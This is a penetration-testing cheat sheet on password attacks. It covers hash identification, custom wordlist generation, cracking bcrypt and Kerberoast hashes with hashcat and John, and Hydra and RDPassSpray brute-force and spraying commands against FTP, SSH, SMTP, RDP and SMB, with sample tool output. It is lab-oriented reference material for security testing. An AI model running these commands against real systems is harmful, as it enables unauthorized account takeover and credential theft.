# Crack them all

## Table of contents

##### ➤ Existing dictionnaries and password lists

* [1. Detect hashes types](#detect-hashes-types)
* [2. Default passwords](#default-passwords)
* [3. Common dictionnaries](#common-dictionnaries)

##### ➤ Wordlist generator

* [0. Basic wordlist creation commands](#basic-wordlist-creation-commands)
* [1. Generate username list using username_generator](#generate-username-list-using-username-generator)
* [2. CUPP - Common User Password Profiler](#cupp---common-user-password-profiler)
* [3. Generate wordlist based on website content](#generate-wordlist-based-on-website-content)
* [4. Generate passwords list using Crunch](#generate-passwords-list-using-crunch)
* [5. Generate passwords list using John](#generate-passwords-list-using-john) 

##### ➤ Online cracking databases

* [1. Online cracking databases](#online-cracking-databases)


##### ➤ Bruteforcing file type

* [1. PDF file](#pdf-file)

##### ➤ Crack popular hash

* [1. Kerberoast hash](#kerberoast-hash)



##### ➤ Bruteforcing and spraying attacks on common services

* [1. FTP (port 21)](#ftp-port-21)
* [2. SSH (port 22)](#ssh-port-22)
* [3. SMTP (port 25 - 465)](#smtp-port-25---465)
* [4. RDP (port 3389)](#rdp-port-3389)
* [5. SMB (port 139 - 445)](#smb-port-139---445)
* [6. Web login page](#web-login-page)
* [7. Outlook web access (OWA) portal](#outlook-web-access-owa-portal)

# 
# ⭕ Existing dictionnaries and password lists

## 🔻Detect hashes types


#### Using online ressources :

https://hashcat.net/wiki/doku.php?id=example_hashes

https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

#### Using script :

➤ Hashid

<img width="753" height="175" alt="image" src="https://github.com/user-attachments/assets/03f05b57-b2c4-44df-a724-85382fc659bf" />

➤ Hash-identifier

<img width="907" height="360" alt="image" src="https://github.com/user-attachments/assets/ba548a62-f0e2-41b2-9d40-98f0acd7e5ae" />


#### Example Bcrypt :

➤ Unidentified hash
kiosec:$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS

➤ Detect hash format
<img width="1312" height="189" alt="image" src="https://github.com/user-attachments/assets/4a2dbc6a-b1aa-419d-b922-8fc1e5f4d01d" />

➤ Crack hash 
hashcat -a 0 -m 3200 hash.txt rockyou.txt -w 3 -O


## 🔻Default passwords

| URL | Description |
| --- | --- |
| https://cirt.net/passwords | |
| https://default-password.info/ | |
| https://datarecovery.com/rd/default-passwords/ | |


## 🔻Common dictionnaries

#### Weak password

| URL | Description |
| --- | --- |
| https://wiki.skullsecurity.org/index.php?title=Passwords | This includes the most well-known collections of passwords. |
|SecLists | A huge collection of all kinds of lists, not only for password cracking. |

#### Leak password

| URL | Description |
| --- | --- |
| https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases | |


# 
# ⭕ Wordlist generator


## 🔻Basic wordlist creation commands
```
#Combined multiples password list
kiosec@cyberlab$  cat file1.txt file2.txt file3.txt > combined_list.txt

#Clean up the generated combined list to remove duplicated words
kiosec@cyberlab$  sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```


## 🔻Generate username list using username_generator
```
kiosec@cyberlab$ git clone https://github.com/therodri2/username_generator.git
<...>

kiosec@cyberlab$ cd username_generator

kiosec@cyberlab$ echo "John Doe" > users.lst
kiosec@cyberlab$ python3 username_generator.py -w users.lst
usage: username_generator.py [-h] -w wordlist [-u]
john
doe
j.doe
j-doe
j_doe
j+doe
jdoe
```


## 🔻CUPP - Common User Password Profiler

CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc.

#### Installation
```
kiosec@cyberlab$  git clone https://github.com/Mebus/cupp.git
<...>
```

#### Generate a wordlist based on the user public information
```
kiosec@cyberlab$   python3 cupp.py -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: 
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name:


> Do you want to add some key words about the victim? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to .....txt, counting ..... words.
> Hyperspeed Print? (Y/n)
```

#### Generate a wordlist based on the categories
```
kiosec@cyberlab$  python3 cupp.py -l
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

> Enter number:
Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing!

Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the -a option. 
```

#### Parse default usernames and passwords directly from Alecto DB.
```
kiosec@cyberlab$  python3 cupp.py -a
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Checking if alectodb is not present...
[+] Downloading alectodb.csv.gz from https://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...

[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt
[+] Done.
```


## 🔻Generate wordlist based on website content
```
#Generate a list based on website 
-w will write the contents to a file. In this case, list.txt.
-m 5 gathers strings (words) that are 5 characters or more
-d 5 is the depth level of web crawling/spidering (default 2)

kiosec@cyberlab$  cewl -w list.txt -d 5 -m 5 http://mycyberlab.com
```


## 🔻Generate passwords list using Crunch
```
#Definition
@ - lower case alpha characters
, - upper case alpha characters
% - numeric characters
^ - special characters including space
2 - the first number is the minimum length of the generated password
2 - the second number is the maximum length of the generated password
01234abc - is the character set to use to generate the passwords
-o list.txt - saves the output to the 3digits.txt file

#Example 01:
kiosec@cyberlab$  crunch 2 2 01234abcd -o crunch.txt
kiosec@cyberlab$ cat crunch.txt
00
..
dd

#Example 02:
kiosec@cyberlab$  crunch 6 6 -t pass%%
pass00
pass01
pass02
pass03
<...>
```


## 🔻Generate passwords list using John

#### Display all rules based
```
#The rules are location into /etc/john/john.conf or /opt/john/john.conf
kiosec@cyberlab$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
JumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
Jumbo
KoreLogic
T9
```

#### Applied a john' rules base on an existing wordlist
```
#Create a wordlist with only one password and expand it using a john rule based
--wordlist : to specify the wordlist or dictionary file. 
--rules : to specify which rule or rules to use.
--stdout : to print the output to the terminal.

kiosec@cyberlab$ john --wordlist=/tmp/my-single-password-list.txt --rules=KoreLogic --stdout
<...>
```

#### Create a new john' rules base
```
WIP
```


# 
# ⭕ Online cracking databases

## 🔻Online cracking databases

| URL | Description |
| --- | --- |
| https://crackstation.net/ | |
| https://ntlm.pw/ | |



# 
# ⭕ Bruteforce file type

## 🔻PDF file
```
pdfcrack -f [pdf_file] -w [dico]
```


# 
# ⭕ Crack popular hash

## 🔻Kerberoast hash

#### Example of kerberoast hash obtained using Rubeus
```
PS C:\xampp\htdocs\uploads> .\rubeus.exe kerberoast /outfile:kerberoast.hashes

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : kiosec
[*] DistinguishedName      : CN=kiosec,CN=Users,DC=cyberlab,DC=local
[*] ServicePrincipalName   : MSSQLSvc/DC.cyberlab.local
[*] PwdLastSet             : 5/21/2022 12:33:45 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\xampp\htdocs\uploads\kerberoast.hashes

[*] Roasted hashes written to : C:\xampp\htdocs\uploads\kerberoast.hashes
PS C:\xampp\htdocs\uploads> type kerberoast.hashes
$krb5tgs$23$*kiosec$cyberlab.local$MssqlSvc/DC.cyberlab.local*$5A79591853849A73DC7CB87A6B855A23$9B0FF288F9F425689254E899A223687E4607EF61715C1449226A9E6C7237D21AE886C5D542A19C314286C0D39FFDA4241F88B52E186CE4E07178DEEADBBAC8BF86431E4982B6CD2ADCC0991C0C1344F4D5755E19BF69AA6BF9C2BFE9B5701270105E2EC68D8E19AB326743C67D3023B09394B0C9EADFAC51AA09D776BE8E07DAA9B9F581351E1B62EABF567E0ABE6B96F13A7DF2CAC959B63D8F60E22B3CACEBAB38FC787AD266A26AA4F4AF0C520CCB3A2D8F03F618FB7FD57A62D270529975EDBEF56959A40F9242798CD7E707A930202B77B79C8E354FF183F2701C09847926C2C3E4CF01D639DEA5C63D482EE8AADB4F217EEF9C7B93B3A399C8332DBDC90DA6887EB7CB7753E5B2E4A0F6DA0AF2E1C2C55371625C426DD3C8ED290DF32AE699F5536BAD2DCE994DB79847AB782E1DD14C8E0EC319006735BD2CADC275294D92748FAA370A65FCD13FF6161D4A35E687DF431BD59E0A8AA2F7766B08F6846B768011508D8271C61928E4C52AC58DEDBFD0E1DDA4BE050727A2CAE5B53E613736E059775F1F2AD4D5CF79F5647CD59A1DD1171088871B70BBD01B1121129226008F2F14A15DBB892222806E5F93C0BB6762F756A4493A83D50DC101AAF10ABDF550B433FBAC52C7FF9C33EE02678CDF94117FCC306D7AEFA33B55EF3336609FA6819EFD5B2E592343D87666AA0A86D9BE0A42E43B4541CC6C5AD39409D962BF3EE744B9A3E0AFBC5405D66A100DE44A1CB3C74B5E001EA21E612E4581A0F02E279AAF6162E6C2BA74C1B602236E346DA3CCBF95CD0D2F9AF5914CBDDB00BD63D0FE86855706B01264BE2D04EEC9AF4B37C7DB818F87FA315AE998FB46EDD1954B9A9BBFD5097F267DCCDFCF4EAE88105E01752F17C13101EAD08F112AB596D6F5260957B269D2300CD446E028A2450D8ECA533888C2D70D22EB7E126A3BB66DF0A825A4636977774607D31552CD749312192BC20B5202EF94706222416076121AA82FABF5F3C9034B5B3A7C52BF41E394DD9C2FCF8A6401BD26F1FBE07A79B7B7EB55433546F302FDC317BB36461B594A1C2449549F538E0CC856F45D418700A4FA07F568D26CAACA5A1B30356E6949A68B6E5AE332CAB98F2D5CC4BDD4046921F6309F1E4FC1AD08B14C6A158C1F6072BE9D14A0ECE1D1850B58E8056D2317985F5491289086BD7DCDC8B31938BB15B7BFA9DB7D484A18B0DEEB490F78967151DBCFE9854044C56EC7073A1A830309B583DE9C0D0E2DA4B3E0068C70CD0ACF44D021AED73CF7400F7D2910122010DB3FD875D9C7A157019BDF909BADAA79CED3BC0D10B7FCA06FE94164CD037E49C60133FE58DBD611812FB2F580D6DA7E6097380FD4B51C11AB08EF90A4DA1B79394BBAD0B857265F65245262D598523E0D891B6F26B18A19B7FDCF34CBDACD34CF8DE2F28CB32ADEDD9AD5835485EFFB4504131533CC9E4EDA0D32D5D6364E2857C03F5D4825AA75CF21CD98BD6FB9A84969625ACBE9A1B18FBDBD16F1B6103C6370980C9B2EC64754E9CE6571E108DC5DC84696DD442D6729988FC8BB04399372C98115B49E5E26FC0F33D004EDAC2163ECAA34196884DCB8E0BDAC914D7190EECD
```

💥 **Important note:** Be carefull with space and invisible \n. In some case, use a file editor to remove them properly in case of copy/paste

#### Crack using John
```
john kerberoast.hashes -w=rockyou.txt 
```

#### Crack using Hashcat
```
hashcat -m 13100 kerberoast.hashes ~/.local/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```


# 
# ⭕ Bruteforce common services


## 🔻FTP (port 21)

#### FTP password bruteforce using Hydra
```
#Details :
# -l : ftp we are specifying a single username, use-L for a username wordlist
# -P : Path specifying the full path of wordlist, you can specify a single password by using -p.
# ftp://10.10.x.x : the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

Example of default password list :
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt


## 🔻SSH (port 22)

#### SSH password brutefrocing using Hydra
```
hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
```

#### SSH password spraying using Hydra

➤ Using Hydra
```
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10

[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.
```


## 🔻SMTP (port 25 - 465)

#### SMTP password bruteforce using Hydra
```
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```


💥**Important note:** For 465 port
```
hydra -l pittman@clinic.thmredteam.com -P clinic.lst smtp://10.10.216.137:465 -v 
```


## 🔻RDP (port 3389)

#### RDP password spraying

➤ Using RDPPassSpray
```
Url : https://github.com/xFreed0m/RDPassSpray

Install
pip3 install -r requirements.txt
apt-get install python-apt
apt-get install xfreerdp

Basic usage :
python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]

kiosec@cyberlab$:~# python3 RDPassSpray.py -U usernames-list.txt -p testPassword -d myCyberlab -T RDP_servers.txt
```


## 🔻SMB (port 139 - 445)

crackmapexec winrm 10.0.0.1 -u kiosec -p passwordlist.txt

Tool: Metasploit (auxiliary/scanner/smb/smb_login)


## 🔻Web login page


## 🔻Outlook web access (OWA) portal

https://github.com/byt3bl33d3r/SprayingToolkit
(atomizer.py)
https://github.com/dafthack/MailSniper
